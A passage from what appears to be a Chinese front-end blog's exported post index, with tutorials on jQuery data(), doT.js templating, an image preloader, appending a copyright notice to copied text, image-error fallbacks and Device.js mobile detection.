attrs.length; while ( i-- ) &#123; if ( attrs[ i ] ) &#123; name = attrs[ i ].name; if ( name.indexOf( "data-" ) === 0 ) &#123; name = jQuery.camelCase( name.slice( 5 ) ); dataAttr( elem, name, data[ name ] ); &#125; &#125; &#125; dataPriv.set( elem, "hasDataAttrs", true ); &#125; &#125; return data; &#125; if ( typeof key === "object" ) &#123; return this.each( function() &#123; dataUser.set( this, key ); &#125; ); &#125; return access( this, function( value ) &#123; var data, camelKey; //如果你通过$selector.data()此方法查找并返回已存入的data if ( elem &amp;amp;&amp;amp; value === undefined ) &#123; data = dataUser.get( elem, key ) || dataUser.get( elem, key.replace( rmultiDash, "-$&amp;amp;" ).toLowerCase() ); if ( data !== undefined ) &#123; return data; &#125; camelKey = jQuery.camelCase( key ); data = dataUser.get( elem, camelKey ); if ( data !== undefined ) &#123; return data; &#125; data = dataAttr( elem, camelKey, undefined ); if ( data !== undefined ) &#123; return data; &#125; return; &#125; camelKey = jQuery.camelCase( key ); this.each( function() &#123; var data = dataUser.get( this, camelKey ); dataUser.set( this, camelKey, value ); if ( key.indexOf( "-" ) &gt; -1 &amp;amp;&amp;amp; data !== undefined ) &#123; dataUser.set( this, key, value ); &#125; &#125; ); &#125;, null, value, arguments.length &gt; 1, null, true ); &#125;, //...省略...&#125; );值得注意的是data会获取多个对象，但是返回的只有一个对象（值）。由此可以看出，使用elem.data(key,value)会执行]jQuery.fn.extend()中的data方法，代码量真不少啊。2、$.data(elem[0],key,value);此种方式代码相简洁接很多了…1234567jQuery.extend( &#123; //...省略多余方法... data: function( elem, name, data ) &#123; return dataUser.access( elem, name, data ); &#125;, //...省略多余方法...&#125; );可能你会问，也许代码都封装在dataUser.access中了，我书读得少你别骗我。那我们看看这个data.access里都有些什么：123456789101112131415Data.prototype = &#123; //...省略... access: function( owner, key, value ) &#123; var stored; if ( key === undefined || ( ( key &amp;amp;&amp;amp; typeof key === "string" ) &amp;amp;&amp;amp; value === undefined ) ) &#123; stored = this.get( owner, key ); return stored !== undefined ? stored : this.get( owner, jQuery.camelCase( key ) ); &#125; this.set( owner, key, value ); return value !== undefined ? value : key; &#125;, //...省略...&#125;其实access方法在第一种方式中返回时也调用，而由于html5的data标签和很多判断绕了许多弯路，使用jquery函数上上的data方法更加直接效率更高。那么有人会问了，那我们以后都用第二种方式还需要第一种干嘛？这就要讲讲elem.data(key,value)和$.data(elem[0],key,value)的区别了。先看下面的例子：123456789var div1 = $("div"), div2 = $("div");div1.data('key',"1");div2.data('key',"2");console.log(div1.data('key'),div2.data('key')); //2 2$.data(div1,'key','1');$.data(div2,'key','2');console.log($.data(div1,'key'),$.data(div2,'key'));//1 2你看出区别了吗$.data(div1, “key”, “1”)的方法会根据elem的不同创建不同的对象来进行存储数据， div1.data(“key”, “1”)的方法则替换掉了原来的数据。讲了这么多总结一下：1、如果在全局定义变量，而要在每次方法中替换data值用第一种方式（elem.data(key,value)）；2、如果是为了获取并赋值dom的data并且记录每次改变的值，推荐使用第二种形式（$.data(elem[0],key,value)）；3、还有一点需要注意：jquery-data是单向绑定，不会因为你改变data而联动改变html5中data-属性值，切记；]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>Jquery-data</tag>
        <tag>Jquery-data的两种使用方式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DOT.JS使用详解]]></title>
    <url>%2F2016%2F03%2F11%2Fdot-js%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[一、DOT.js介绍dot.js是一个模板框架，在web前端使用，其主要特点是快，小，无依赖其他插件。主要的用途就是，在写好的模板上，放进数据，生成含有数据的html代码。这是很简单的web前端模板框架，简单说几个东西，你就会用了！1、在模板中，it这个变量，就是传递进去的数据对象，应该就是英语的items；2、doT.template( template )( obj ) 代码解释：把模板template，作为参数传入doT.template() 方法，dot就把模板处理一下，然后你再把数据对象传入，返回值，就是html与数据 一起生成的html代码了，再拼接到页面即可；3、在模板中，&#123;&#123;&#125;&#125;包裹的内容，就是javascript代码，dot会负责处理，因为这写法怪异，新手一般出现模板写错的情况，仔细排查即可；二、性能介绍曾经研究过jquery tmpl，于是在项目里引入JS模版，有人告诉我这个引擎的速度很慢，于是我又去搜集了一下资料，结果发现jquery tmpl是最慢的，于是乎我就放弃了，对比下来发现胜出的有以下几种artTemplate,dot,juicer三个从速度上胜出(chrome)，但是在IE下最终选择了dot，dot的文件是最小只有5K（没有压缩），并且在IE里也是最快的。三、DOT.js的API标签介绍&#123;&#123; &#125;&#125;&emsp;JS原生态代码&#123;&#123;= &#125;&#125;&emsp;变量运算，赋值 &#123;&#123;=it.f1 + it.f2&#125;&#125;&#123;&#123;! &#125;&#125;&emsp;&emsp;赋值并且编码&#123;&#123;# &#125;&#125;&emsp;&emsp;&#123;&#123;### &#125;&#125;&emsp;&emsp;这两个没有仔细研究，基本我也不用它&#123;&#123;? &#125;&#125;&emsp;条件语句&#123;&#123;- &#125;&#125;&emsp; 循环，其实条件语句和循环可以用123&#123;&#123;if &#125;&#125;&#123;&#123;else if&#125;&#125;&#123;&#123;for(var i=0;i&lt;length;i++)&#125;&#125;来代替，也就是JS的原生态代码四、DOT.js使用方法调用方式：12var tmpText = doT.template(模板);tmpText(数据源);例子一：1、for interpolation 赋值格式：&#123;&#123;= &#125;&#125;&emsp;数据源：1&#123;"name":"Jake","age":31&#125;区域:&lt;div id=&quot;interpolation&quot;&gt;&lt;/div&gt;模板：1234&lt;script id="interpolationtmpl" type="text/x-dot-template"&gt;&lt;div&gt;Hi &#123;&#123;=it.name&#125;&#125;!&lt;/div&gt;&lt;div&gt;&#123;&#123;=it.age || ''&#125;&#125;&lt;/div&gt;&lt;/script&gt;调用方式：123var dataInter = &#123;"name":"Jake","age":31&#125;;var interText = doT.template($("#interpolationtmpl").text());$("#interpolation").html(interText(dataInter));例子二：2、for evaluation for in 循环格式：123&#123;&#123; for var key in data &#123; &#125;&#125;&#123;&#123;= key &#125;&#125;&#123;&#123; &#125; &#125;&#125;数据源：123456&#123; "name":"Jake", "age":31, "interests":["basketball","hockey","photography"], "contact":&#123;"email":"jake@xyz.com","phone":"999999999"&#125;&#125;区域：&lt;div id=&quot;evaluation&quot;&gt;&lt;/div&gt;模板：12345&lt;script id="evaluationtmpl" type="text/x-dot-template"&gt;&#123;&#123; for(var prop in it) &#123; &#125;&#125;&lt;div&gt;KEY:&#123;&#123;= prop &#125;&#125;---VALUE:&#123;&#123;= it[prop] &#125;&#125;&lt;/div&gt;&#123;&#123; &#125; &#125;&#125;&lt;/script&gt;调用方式：123var dataEval = &#123;"name":"Jake","age":31,"interests":["basketball","hockey","photography"],"contact":&#123;"email":"jake@xyz.com","phone":"999999999"&#125;&#125;;var evalText = doT.template($("#evaluationtmpl").text());$("#evaluation").html(evalText(dataEval));例子三：3、for array iteration 数组格式：123&#123;&#123;~data.array :value:index &#125;&#125;...&#123;&#123;~&#125;&#125;数据源:1&#123;"array":["banana","apple","orange"]&#125;区域：&lt;div id=&quot;arrays&quot;&gt;&lt;/div&gt;模板：12345&lt;script id="arraystmpl" type="text/x-dot-template"&gt;&#123;&#123;~it.array:value:index&#125;&#125;&lt;div&gt;&#123;&#123;= index+1 &#125;&#125;&#123;&#123;= value &#125;&#125;!&lt;/div&gt;&#123;&#123;~&#125;&#125;&lt;/script&gt;调用方式：123var dataArr = &#123;"array":["banana","apple","orange"]&#125;;var arrText = doT.template($("#arraystmpl").text());$("#arrays").html(arrText(dataArr));例子四：4、&#123;&#123;? &#125;&#125;&emsp; for conditionals 条件格式：123&#123;&#123;? &#125;&#125; if&#123;&#123;?? &#125;&#125; else if&#123;&#123;??&#125;&#125; else数据源：1&#123;"name":"Jake","age":31&#125;区域：&lt;div id=&quot;condition&quot;&gt;&lt;/div&gt;模板：123456789&lt;script id="conditionstmpl" type="text/x-dot-template"&gt;&#123;&#123;? !it.name &#125;&#125;&lt;div&gt;Oh, I love your name, &#123;&#123;=it.name&#125;&#125;!&lt;/div&gt;&#123;&#123;?? !it.age === 0&#125;&#125;&lt;div&gt;Guess nobody named you yet!&lt;/div&gt;&#123;&#123;??&#125;&#125;You are &#123;&#123;=it.age&#125;&#125; and still dont have a name?&#123;&#123;?&#125;&#125;&lt;/script&gt;调用方式：123var dataEncode = &#123;"uri":"http://grycheng.com/?keywords=Yoga","html":"&lt;div style='background: #f00; height: 30px; line-height: 30px;'&gt;html元素&lt;/div&gt;"&#125;;var EncodeText = doT.template($("#encodetmpl").text());$("#encode").html(EncodeText(dataEncode));例子五：5、for interpolation with encoding数据源：1&#123;"uri":"http://grycheng.com/?keywords=Yoga"&#125;格式：1&#123;&#123;!it.uri&#125;&#125;区域：&lt;div id=&quot;encode&quot;&gt;&lt;/div&gt;模板：123&lt;script id="encodetmpl" type="text/x-dot-template"&gt;Visit &#123;&#123;!it.uri&#125;&#125; &#123;&#123;!it.html&#125;&#125;&lt;/script&gt;调用方式：123var dataEncode = &#123;"uri":"http://grycheng.com/?keywords=Yoga","html":"&lt;div style='background: #f00; height: 30px; line-height: 30px;'&gt;html元素&lt;/div&gt;"&#125;;var EncodeText = doT.template($("#encodetmpl").text());$("#encode").html(EncodeText(dataEncode));例子六：6、&#123;&#123;# &#125;&#125;&emsp; for compile-time evaluation/includes and partials&#123;&#123;## #&#125;&#125;&emsp; for compile-time defines数据源：1&#123;"name":"Jake","age":31&#125;区域：&lt;div id=&quot;part&quot;&gt;&lt;/div&gt;模板：1234567&lt;script id="parttmpl" type="text/x-dot-template"&gt;&#123;&#123;##def.snippet:&lt;div&gt;&#123;&#123;=it.name&#125;&#125;&lt;/div&gt;&#123;&#123;#def.joke&#125;&#125;#&#125;&#125;&#123;&#123;#def.snippet&#125;&#125;&#123;&#123;=it.html&#125;&#125;&lt;/script&gt;调用方式：1234var dataPart = &#123;"name":"Jake","age":31,"html":"&lt;div style='background: #f00; height: 30px; line-height: 30px;'&gt;html元素&lt;/div&gt;"&#125;;var defPart = &#123;"joke":"&lt;div&gt;&#123;&#123;=it.name&#125;&#125; who?&lt;/div&gt;"&#125;;var partText = doT.template($("#parttmpl").text(), undefined, defPart);$("#part").html(partText(dataPart));五、使用扩展我们用到的只有前三种标签就完全够用了，下面给出一个例子，就很容易看明白了：12345678910111213141516171819&lt;script id="tmpl-demo" type="text/tmpl"&gt;&#123;%if($data.suc)&#123;%&#125;&#123;%for (var i = 0; i &lt; $data.users.length; i++) &#123; %&#125;&#123;%var user=$data.users[i];%&#125;&lt;div style="margin-bottom:10px;"&gt;&lt;span style="margin-left:10px;"&gt;&#123;%= user.Name%&#125;&lt;/span&gt;&#123;%! user.url%&#125;&#123;%=global%&#125;&lt;/div&gt;&#123;%&#125;%&#125;&#123;%each($data);%&#125;&#123;%&#125;%&#125;&lt;/script&gt;&lt;script type="text/javascript"&gt;function demo() &#123;var fn = doT.template($("#tmpl-demo").html());$("#demo").append(fn(data));&#125;&lt;/script&gt;&lt;div id="demo"&gt;&lt;/div&gt;可能是有人疑问，不是&#123;&#123; &#125;&#125;吗，其实dot允许自定义包括的标签，这样就会让你使用自己喜欢的模版标签，他的本来的设置是这样的，是不是很容易修改123456789101112131415161718192021var doT = &#123; version: '1.0.1', templateSettings: &#123; evaluate: /\&#123;\&#123;([\s\S]+?(\&#125;?)+)\&#125;\&#125;/g, interpolate: /\&#123;\&#123;=([\s\S]+?)\&#125;\&#125;/g, encode: /\&#123;\&#123;!([\s\S]+?)\&#125;\&#125;/g, use: /\&#123;\&#123;#([\s\S]+?)\&#125;\&#125;/g, useParams: /(^|[^\w$])def(?:\.|\[[\'\"])([\w$\.]+)(?:[\'\"]\])?\s*\:\s*([\w$\.]+|\"[^\"]+\"|\'[^\']+\'|\&#123;[^\&#125;]+\&#125;)/g, define: /\&#123;\&#123;##\s*([\w\.$]+)\s*(\:|=)([\s\S]+?)#\&#125;\&#125;/g, defineParams: /^\s*([\w$]+):([\s\S]+)/, conditional: /\&#123;\&#123;\?(\?)?\s*([\s\S]*?)\s*\&#125;\&#125;/g, iterate: /\&#123;\&#123;~\s*(?:\&#125;\&#125;|([\s\S]+?)\s*\:\s*([\w$]+)\s*(?:\:\s*([\w$]+))?\s*\&#125;\&#125;)/g, varname: '$data', varoption: '$item', strip: true, append: true, selfcontained: false &#125;, template: undefined, //fn, compile template compile: undefined //fn, for express &#125;, global;修改完就是下面这样的，非常简单：123456789101112131415161718192021var doT = &#123; version: '1.0.1', templateSettings: &#123; evaluate: /\&#123;\%([\s\S]+?(\&#125;?)+)\%\&#125;/g, interpolate: /\&#123;\%=([\s\S]+?)\%\&#125;/g, encode: /\&#123;\%!([\s\S]+?)\%\&#125;/g, use: /\&#123;\%#([\s\S]+?)\%\&#125;/g, useParams: /(^|[^\w$])def(?:\.|\[[\'\"])([\w$\.]+)(?:[\'\"]\])?\s*\:\s*([\w$\.]+|\"[^\"]+\"|\'[^\']+\'|\&#123;[^\&#125;]+\&#125;)/g, define: /\&#123;\%##\s*([\w\.$]+)\s*(\:|=)([\s\S]+?)#\%\&#125;/g, defineParams: /^\s*([\w$]+):([\s\S]+)/, conditional: /\&#123;\%\?(\?)?\s*([\s\S]*?)\s*\%\&#125;/g, iterate: /\&#123;\%~\s*(?:\%\&#125;|([\s\S]+?)\s*\:\s*([\w$]+)\s*(?:\:\s*([\w$]+))?\s*\%\&#125;)/g, varname: '$data', varoption: '$item', strip: true, append: true, selfcontained: false &#125;, template: undefined, //fn, compile template compile: undefined //fn, for express &#125;, global;六、下载地址官网：http://olado.github.io]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>DOT.JS</tag>
        <tag>DOT.JS使用介绍</tag>
        <tag>DOT.JS使用详解</tag>
        <tag>DOT.JS使用说明</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[运用预加载提升H5移动页面的用户体验]]></title>
    <url>%2F2016%2F03%2F11%2F%E8%BF%90%E7%94%A8%E9%A2%84%E5%8A%A0%E8%BD%BD%E6%8F%90%E5%8D%87h5%E7%A7%BB%E5%8A%A8%E9%A1%B5%E9%9D%A2%E7%9A%84%E7%94%A8%E6%88%B7%E4%BD%93%E9%AA%8C%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;在做h5移动页面，相信大家一定碰到过页面已经打开，但是里面的图片还未加载出来的情况，这种问题虽然不影响页面的功能，但是不利于用户体验。抛开网速的原因，解决这个问题有多方面的思路：最基本的，要从http请求合并，缓存管理，图片压缩等方面做性能优化；另外就是可以对页面里用到的所有图片做预加载的处理，当用户打开页面的时候不立即显示第一屏，而是先显示资源加载效果，等到加载完毕，再来显示页面的主内容，这样就能解决那个问题。虽然这种加载效果占用了用户的浏览时间，但是我们可以把它做的好看有趣一点，所以也不会影响用户体验。本文实践了这种想法，提供一个非常简洁的图片预加载组件，实现简单，功能不弱，在做移动页面的时候应该对你有参考价值。效果如下图：（源文件下载）1. 实现思路&emsp;&emsp;html里面的img标签和css中background-imag等都会触发浏览器去加载相关的图片，但是如果这个图片已经加载过了的话，浏览器就会直接使用这张已经加载好的图片，从而能够瞬间在页面中渲染出来。通过javascript，创建Image对象，然后把这些对象的src属性设置成要加载的图片地址也能触发浏览器加载图片，利用这一点就能实现图片预加载的功能：在页面里首先把那些用到了相关的图片的元素给藏掉，然后用js去加载图片，等到所有图片加载完毕再把藏掉的元素显示即可。不过这仅仅是一个基本的实现思路，要完成一个功能较健壮的预加载组件，还有以下三个问题：1）进度问题&emsp;&emsp;由于预加载的同时，还得做一个预加载的效果，这就需要把加载的进度实时通知到外部上下文才行。关于进度有两个实现方式，第一是已加载的数据大小/总的数据大小，第二是已加载的文件数/总的文件数，在浏览器里面，采用第一种方式是不现实的，根本没有原生的办法可以做到，所以只能采用第二种。2）图片加载失败的问题&emsp;&emsp;比如说有4张图片，已经加载了50%，在加载第三张的时候出错了，该不该将进度反馈成75%呢？答案是：应该。如果不这么处理的话，进度永远无法到100%，页面主内容就没机会显示了，虽然图片加载有失败的情况，但是跟加载器没有关系，也许图片本身就不存在呢？也就是说图片加载失败不应该影响加载器的功能。3）图片加载超时的问题&emsp;&emsp;图片不能加载太久，否则用户一直停留在加载效果上看不到主内容，用户的等待时间不可控制地延长，导致用户体验下降，这样就有悖加载器的初衷了。所以应该给每个图片设置一个加载的超时时间，如果在所有图片的超时时间之后，还没加载完，就应该主动放弃加载，通知外部上下文加载完毕，显示主内容。综合以上这些需求，本文提供的实现是：12345678910111213141516171819202122232425262728293031323334353637383940414243444546(function () &#123; function isArray(obj) &#123; return Object.prototype.toString.call(obj) === '[object Array]'; &#125; /** * @param imgList 要加载的图片地址列表，['aa/asd.png','aa/xxx.png'] * @param callback 每成功加载一个图片之后的回调，并传入“已加载的图片总数/要加载的图片总数”表示进度 * @param timeout 每个图片加载的超时时间，默认为5s */ var loader = function (imgList, callback, timeout) &#123; timeout = timeout || 5000; imgList = isArray(imgList) &amp;amp;&amp;amp; imgList || []; callback = typeof(callback) === 'function' &amp;amp;&amp;amp; callback; var total = imgList.length, loaded = 0, imgages = [], _on = function () &#123; loaded &lt; total &amp;amp;&amp;amp; (++loaded, callback &amp;amp;&amp;amp; callback(loaded / total)); &#125;; if (!total) &#123; return callback &amp;amp;&amp;amp; callback(1); &#125; for (var i = 0; i &lt; total; i++) &#123; imgages[i] = new Image(); imgages[i].onload = imgages[i].onerror = _on; imgages[i].src = imgList[i]; &#125; /** * 如果timeout * total时间范围内，仍有图片未加载出来（判断条件是loaded &lt; total），通知外部环境所有图片均已加载 * 目的是避免用户等待时间过长 */ setTimeout(function () &#123; loaded &lt; total &amp;amp;&amp;amp; (loaded = total, callback &amp;amp;&amp;amp; callback(loaded / total)); &#125;, timeout * total); &#125;; "function" === typeof define &amp;amp;&amp;amp; define.cmd ? define(function () &#123; return loader &#125;) : window.imgLoader = loader;&#125;)();使用方式（对应代码中的test.html）：123456&lt;script src="../js/imgLoader.js"&gt;&lt;/script&gt;&lt;script&gt;imgLoader(['../img/page1.jpg', '../img/page2.jpg', '../img/page3.jpg'], function(percentage)&#123;console.log(percentage)&#125;);&lt;/script&gt;运行结果：2. demo说明&emsp;&emsp;本文开篇给出的效果，对应的页面是index.html，关于这个效果还有两个问题需要说明：1）它用了之前这篇博客[利用轮播原理结合hammer.js实现简洁的滑屏功能介绍]的滑屏思路，并把它的一些逻辑包装在了swipe.js，对外提供了一个全局变量Swipe，这个模块有一个init的方法，以便外部通过调用Swipe.init()就能初始化滑屏相关的功能，原来没有提供这个init方法，在js加载完毕就会初始化滑屏功能，有了这个init方法就可以把滑屏的逻辑延迟到加载完毕的时候去初始化。index.html一共引用了5个js：12345&lt;script src="js/zepto.js"&gt;&lt;/script&gt;&lt;script src="js/transition.js"&gt;&lt;/script&gt;&lt;script src="js/hammer.js"&gt;&lt;/script&gt;&lt;script src="js/imgLoader.js"&gt;&lt;/script&gt;&lt;script src="js/swipe.js"&gt;&lt;/script&gt;&emsp;&emsp;其中imgLoader.js就是前面介绍图片加载器的实现，前三个js都是为最后一个swipe.js服务的，感兴趣的可以继续我的博客[利用轮播原理结合hammer.js实现简洁的滑屏功能]了解相关内容。不过滑屏不是本文的重点，不了解swipe.js不会影响理解本文的内容~2）虽然我在demo中用到了3张比较大的图片，但是由于在本地环境，加载速度还是非常快，所以一开始的时候，很难看到预加载的效果，最后只能想办法在每个进度回调之前做一下延迟，这才可以看到前面gif图片一开始的那个loading效果，实现方式是：1234567891011121314151617181920212223//模拟加载慢的效果var callbacks = [];imgLoader(['img/page1.jpg', 'img/page2.jpg', 'img/page3.jpg'], function (percentage) &#123; var i = callbacks.length; callbacks.push(function()&#123; setTimeout(function()&#123; var percentT = percentage * 100; $('#loader__info').html('Loading ' + (parseInt(percentT)) + '%'); $('#loader__progress')[0].style.width = percentT + '%'; if (percentage == 1) &#123; setTimeout(function()&#123; $('#loader').remove(); Swipe.init(); &#125;, 600); &#125; callbacks[i + 1] &amp;amp;&amp;amp; callbacks[i + 1](); &#125;,600); &#125;); if(percentage == 1) &#123; callbacks[0](); &#125;&#125;);&emsp;&emsp;在真实环境，最好还是不要刻意去加这种延迟，没必要为了让用户看到一个好看有趣的加载效果，就浪费它不必要的等待时间，所以真实环境还是应该用下面的代码：123456789imgLoader(['img/page1.jpg', 'img/page2.jpg', 'img/page3.jpg'], function (percentage) &#123; var percentT = percentage * 100; $('#loader__info').html('Loading ' + (parseInt(percentT)) + '%'); $('#loader__progress')[0].style.width = percentT + '%'; if (percentage == 1) &#123; $('#loader').remove(); Swipe.init(); &#125;&#125;);3. 注意事项预加载是一种比较常见的实现效果，但是在使用的时候，有些问题需要注意：1）什么时候用页面大的时候用，一般页面大小超过3M就该考虑使用；页面内包含数据量比较大的图片，在手机端测试能够明显看到加载缓慢的时候，可以考虑使用。2）尽量使用sprite图片3）加载效果实现的时候，尽量不用图片，即使要用也应该用很小的图片，否则加载效果卡在那就没有意义了。4. 总结&emsp;&emsp;本文主要介绍了一个简单的图片预加载器，可应用于h5移动页面的开发当中，在它的思路之下，如果有必要的话，还可以对它进行一些改造，用它来加载其它类型的资源，比如音频或者视频文件，毕竟这些类型的DOM对象也都有提供类似Image对象的属性和回调。与预加载的方式相反的，还有一种图片懒加载的技术，现在网上已经有比较好用的jquery插件了，不过还是很值的去深入了解下它的思路跟实现要点，等我有时间去研究研究再写博客来介绍，敬请关注！]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>运用预加载提升H5移动页面的用户体验</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[复制网页内容自动添加版权信息的方法(兼容IE、Firefox和Chrome)]]></title>
    <url>%2F2016%2F03%2F10%2F%E5%A4%8D%E5%88%B6%E7%BD%91%E9%A1%B5%E5%86%85%E5%AE%B9%E8%87%AA%E5%8A%A8%E6%B7%BB%E5%8A%A0%E7%89%88%E6%9D%83%E4%BF%A1%E6%81%AF%E7%9A%84%E6%96%B9%E6%B3%95%E5%85%BC%E5%AE%B9ie%E3%80%81firefox%E5%92%8Cc%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;在网上一搜可以看到很多类似的代码，加入网页body部分就可以。例如下面这段代码：12345678910111213//复制内容自动添加版权信息document.body.oncopy = function ()&#123; setTimeout(function ()&#123; var text = clipboardData.getData("text"); if (text) &#123; text = text + "\r\n原文出自【grycheng前端博客】，转载请保留原文链接："+location.href; clipboardData.setData("text", text); &#125; &#125;, 100 )&#125;&emsp;&emsp;这段代码就可以实现，别忘了要写在js文件中或者直接写在页面中用="text/javascript">``` 代码 ``````包含进去。12345678910111213141516171819202122232425262728293031323334353637383940414243444546加上以上代码后，别人在你网站的任何一个页面，复制任何一个文字的东西，粘贴时都会自动带上版权信息。但这个代码的不足之处是：在IE6上测试通过，而在Firefox、Opera浏览器上没有效果。&amp;emsp;&amp;emsp;为了解决这个问题，请教了很多高手，也在网上查了很多资料，终于解决了，在这里想说一句，度娘真的很强大。以下贴出兼容代码:```javascript//复制内容自动添加版权信息 var Sys = &#123;&#125;; var ua = navigator.userAgent.toLowerCase(); if( window.ActiveXObject ) &#123; document.body.oncopy=function() &#123; event.returnValue = false; var t=document.selection.createRange().text; var s=&quot;\r\n原文出自[grycheng前端博客] 转载请保留原文链接:&quot;+location.href; clipboardData.setData(&apos;Text&apos;,t+&apos;\r\n&apos;+s); &#125; &#125; else &#123; function addLink() &#123; var body_element = document.getElementsByTagName(&apos;body&apos;)[0]; var selection; selection = window.getSelection(); var pagelink = &quot; 原文出自[grycheng前端博客] 转载请保留原文链接:&quot;+document.location.href; var copytext = selection + pagelink; var newdiv = document.createElement(&apos;div&apos;); newdiv.style.position=&apos;absolute&apos;; newdiv.style.left=&apos;-99999px&apos;; body_element.appendChild(newdiv); newdiv.innerHTML = copytext; selection.selectAllChildren(newdiv); window.setTimeout ( function() &#123; body_element.removeChild(newdiv); &#125;,0 ); &#125; document.oncopy = addLink; &#125;&emsp;&emsp;这个代码经测试，可以兼容，可能还有不足的地方，如有发现，可以在下方留言，共同探讨、改进。最好说一点，注意编码问题，如发现复制的内容添加的版权信息乱码，可以自行检查编码问题。]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>Firefox和Chrome)</tag>
        <tag>复制网页内容自动添加版权信息的方法(兼容IE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[图片加载失败，导致的浏览器兼容问题]]></title>
    <url>%2F2016%2F03%2F10%2F%E5%9B%BE%E7%89%87%E5%8A%A0%E8%BD%BD%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%AF%BC%E8%87%B4%E7%9A%84%E6%B5%8F%E8%A7%88%E5%99%A8%E5%85%BC%E5%AE%B9%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;网站当中经常会遇到图片加载失败的问题，img中有地址，但是地址打开是错误的。情况如下：&emsp;&emsp;不同浏览器处理错误图片是不一样的，有的干脆就显示差号，例如IE，有的显示一张破碎的图片，有的则是给一张高度比较大的默认图，例如PC端的火狐，IOS中Safari,还有安卓中的UC浏览器。这样在手机中就会导致左右两侧图片高度不一致！如下图：解决方案&emsp;&emsp;其实这里解决很简单，判断当图片加载失败的时候给一个默认图就可以了，不让浏览器使用其自带的默认图。1&lt;img src="http://www.npm8.com/upload/images/water.png" onerror="javascript：this.src='http://www.npm8.com/wp-content/themes/grycheng/images/logo.png';" alt="pic" /&gt;衍生问题&emsp;&emsp;因为图片加载失败进入默认图，那么默认图再加载失败怎么办呢？这不是进入一个死循环吗？&emsp;&emsp;最简单的一个解决办法是，onerror中的图保证能打开，保证比较小！不会出现问题！。这个方法也是最有效的方法！假如你不能保证，那么，只能靠函数来解决这个问题了！思路是：&emsp;&emsp;当图片加载失败，进入onerror的时候，判断onerror的图片是不是能加载，在onerror中的图片触发onerror的时候，设置onerror为null。代码如下：123456789&lt;img src="logo.png" alt="" /&gt;&lt;script type="text/javascript"&gt;// &lt;![CDATA[function nofind()&#123;var img=event.srcElement || event.target ; //获取img对象，火狐是event.target ，IE及谷歌其他是event.srcElementconsole.dir(img);//大家可以打印看一下img.src="http://www.npm8.com/wp-content/themes/grycheng/images/logo.png";img.onerror=null;&#125;// ]]&gt;&lt;/script&gt;]]></content>
      <categories>
        <category>前端兼容</category>
      </categories>
      <tags>
        <tag>图片加载失败，导致的浏览器兼容问题</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[检测设备平台、操作系统、方向 Javascript 库:Device.js]]></title>
    <url>%2F2016%2F03%2F08%2F%E6%A3%80%E6%B5%8B%E8%AE%BE%E5%A4%87%E5%B9%B3%E5%8F%B0%E3%80%81%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%81%E6%96%B9%E5%90%91-javascript-%E5%BA%93device-js%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;在 Web 项目中，有时候我们需要根据程序运行的环境采取特定操作。Device.js 是一个很小的JavaScript库，它简化了编写和平台，操作系统或浏览器相关的条件 CSS 或 JavaScript 代码。Device.js 是一个可以让你检测设备的平台，操作系统和方向 JavaScript 库，它会自动在标签添加一些设备平台，操作系统，方向相关的 CSS class，这样就能让你针对不同设备撰写不同的 CSS，并且还提供一些 Javascript 函数来判断设备。&emsp;&emsp;Device.js 通过操作系统（比如 iOS，安卓，黑莓，Windows，Firefox OX），方向（横屏或者竖屏），类型（平板或者移动设备），如下面在 iPhone 上的浏览的时候在添加的 CSS Class：支持的设备iOS: iPhone, iPod, iPadAndroid: Phones &amp; TabletsBlackberry: Phones &amp; TabletsWindows: Phones &amp; TabletsFirefox OS: Phones &amp; Tablets如何使用Device.js 使用非常简单，只需要在页面的 head 载入相关的 JS 库即可：1&lt;script src="device.js"&gt;&lt;/script&gt;生成的 CSS Class：相关的 Javascript 函数实例：判断移动设备最佳方法 并实现跳转至手机版网页STEP 1: 引入 JS 文件1&lt;script src=”device.min.js”&gt;&lt;/script&gt;STEP 2: 加入判断代码12345&lt;script type=”text/javascript”&gt;if(device.mobile())&#123;window.location = “shouji.html”; //可以换成http地址&#125;&lt;/script&gt;&emsp;&emsp;Device.js 方法有很多，若你想实现对某个设备的判断，则要使用device.mobile()。以上方法判断手机端很实用的，尤其是电脑版网页和手机版网页分别用不同的网站域名时，使用该方法可以免去用户记2个域名烦恼！&nbsp;查看演示点击下载]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>Device.js</tag>
        <tag>操作系统</tag>
        <tag>方向 Javascript 库:Device.js</tag>
        <tag>检测设备平台</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[解决移动端页面上下滑动Bug]]></title>
    <url>%2F2016%2F03%2F08%2F%E8%A7%A3%E5%86%B3%E7%A7%BB%E5%8A%A8%E7%AB%AF%E9%A1%B5%E9%9D%A2%E4%B8%8A%E4%B8%8B%E6%BB%91%E5%8A%A8bug%2F</url>
